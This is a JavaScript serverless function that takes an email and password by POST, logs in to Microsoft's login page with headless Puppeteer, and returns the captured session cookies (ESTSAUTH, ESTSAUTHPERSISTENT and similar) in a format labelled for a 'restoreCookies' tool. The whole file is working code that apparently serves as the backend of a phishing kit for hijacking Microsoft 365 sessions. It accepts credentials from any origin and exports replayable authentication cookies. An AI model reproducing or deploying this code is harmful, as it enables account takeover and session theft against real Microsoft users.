const puppeteer = require('puppeteer');

exports.handler = async (event, context) => {
  // Set CORS headers
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Content-Type': 'application/json'
  };

  // Handle preflight requests
  if (event.httpMethod === 'OPTIONS') {
    return {
      statusCode: 200,
      headers,
      body: ''
    };
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' })
    };
  }

  try {
    const { email, password } = JSON.parse(event.body);
    
    if (!email || !password) {
      return {
        statusCode: 400,
        headers,
        body: JSON.stringify({ 
          success: false, 
          error: 'Email and password required' 
        })
      };
    }

    console.log('🔐 Starting Microsoft cookie capture for:', email);

    // Launch browser with specific settings for Microsoft
    const browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu',
        '--disable-web-security',
        '--disable-features=VizDisplayCompositor'
      ]
    });

    const page = await browser.newPage();
    
    // Set user agent to mimic real browser
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    
    // Set viewport
    await page.setViewport({ width: 1366, height: 768 });

    console.log('🌐 Navigating to Microsoft login...');
    
    // Navigate to Microsoft login page
    await page.goto('https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&response_type=code&redirect_uri=https%3A%2F%2Fwww.office.com%2F&scope=openid%20profile%20email&state=capture', {
      waitUntil: 'networkidle2',
      timeout: 30000
    });

    console.log('📧 Entering email...');
    
    // Wait for email input and enter email
    await page.waitForSelector('input[type="email"], input[name="loginfmt"]', { timeout: 10000 });
    await page.type('input[type="email"], input[name="loginfmt"]', email);
    
    // Click Next button
    await page.click('input[type="submit"], button[type="submit"]');
    
    // Wait for password page
    await page.waitForSelector('input[type="password"], input[name="passwd"]', { timeout: 10000 });
    
    console.log('🔑 Entering password...');
    
    // Enter password
    await page.type('input[type="password"], input[name="passwd"]', password);
    
    // Click Sign in button
    await page.click('input[type="submit"], button[type="submit"]');
    
    // ✅ UPDATED: Wait longer for authentication to process and cookies to be set
    console.log('⏳ Waiting for authentication to complete and cookies to be set...');
    await page.waitForTimeout(8000);
    
    console.log('🍪 Capturing cookies...');
    
    // Get all cookies from the page
    const cookies = await page.cookies();
    
    // Filter for Microsoft-related cookies
    const microsoftCookies = cookies.filter(cookie => 
      cookie.domain.includes('microsoft') || 
      cookie.domain.includes('office') || 
      cookie.domain.includes('login') ||
      cookie.name.includes('ESTSAUTH') ||
      cookie.name.includes('SignInStateCookie') ||
      cookie.name.includes('ESTSAUTHPERSISTENT') ||
      cookie.name.includes('ESTSECAUTH')
    );

    console.log(`✅ Captured ${microsoftCookies.length} Microsoft cookies`);
    
    // ✅ UPDATED: Log captured cookie names for debugging
    if (microsoftCookies.length > 0) {
      console.log('🔐 Captured cookies:', microsoftCookies.map(c => c.name).join(', '));
    }
    
    await browser.close();

    // Format cookies for compatibility with restoreCookies.ts
    const formattedCookies = microsoftCookies.map(cookie => ({
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path,
      secure: cookie.secure,
      httpOnly: cookie.httpOnly,
      sameSite: cookie.sameSite || 'None',
      expires: cookie.expires,
      expirationDate: cookie.expires,
      session: !cookie.expires
    }));

    console.log('✅ [captureFromMicrosoft] Successfully captured and formatted cookies');

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        cookies: formattedCookies,
        totalCookies: formattedCookies.length,
        domain: 'login.microsoftonline.com',
        timestamp: new Date().toISOString(),
        source: 'puppeteer-backend-capture',
        capturedCookies: formattedCookies.map(c => c.name)
      })
    };

  } catch (error) {
    console.error('❌ Microsoft cookie capture error:', error);
    console.error('❌ Error message:', error.message);
    console.error('❌ Stack trace:', error.stack);
    
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        success: false,
        error: error.message,
        errorType: error.constructor.name,
        cookies: [],
        totalCookies: 0
      })
    };
  }
};